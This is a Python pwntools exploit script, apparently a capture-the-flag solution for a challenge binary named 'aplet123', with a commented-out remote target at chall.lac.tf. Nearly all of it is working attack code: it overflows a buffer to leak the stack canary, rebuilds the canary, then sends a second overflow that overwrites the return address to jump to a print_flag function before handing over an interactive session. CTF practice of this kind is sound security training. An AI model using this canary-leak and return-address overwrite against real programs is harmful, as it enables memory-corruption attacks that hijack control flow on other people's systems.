#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template aplet123
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'aplet123')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()
#io = remote('chall.lac.tf', 31123)

payload = b'A'*69 + b"i'm"
io.recvline()
io.sendline(payload)

data = io.recvline()
log.info(len(data))
log.info(data[2:][:9])
canary = data[2:][:8]

new_canary = b'\x00' + canary[1:]

for byte in new_canary[::-1]:
    print(hex(byte), end=' ')

new_canary = new_canary[::-1]
int_canary = int.from_bytes(new_canary)

ovf = 72*b'A' + p64(int_canary) + 8*b'A' +p64(exe.sym['print_flag'])
log.success(hex(exe.sym['print_flag']))

io.sendline(ovf)
io.sendline(b"bye")

io.interactive()

